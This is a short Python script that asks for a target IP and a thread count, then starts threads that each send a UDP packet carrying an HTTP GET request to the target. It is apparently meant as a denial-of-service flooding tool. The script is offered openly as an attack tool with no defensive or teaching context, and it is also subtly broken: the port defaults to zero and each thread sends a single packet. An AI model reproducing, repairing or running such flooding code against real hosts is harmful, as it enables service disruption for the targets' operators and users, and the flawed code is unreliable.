import threading
import socket

ip = socket.gethostbyname(input("IP: "))
threads = int(input("Threads: "))
port = int()


def l7_udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        s.sendto(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode(), (ip, port))

        print("\033[32m[+]\033[0m L7 UDP Packet sent ->", ip)

    except Exception as err:
        print("\033[31m[-]\033[0m", err)


for i in range(threads):
    t = threading.Thread(target=l7_udp)
    t.start()

input("")
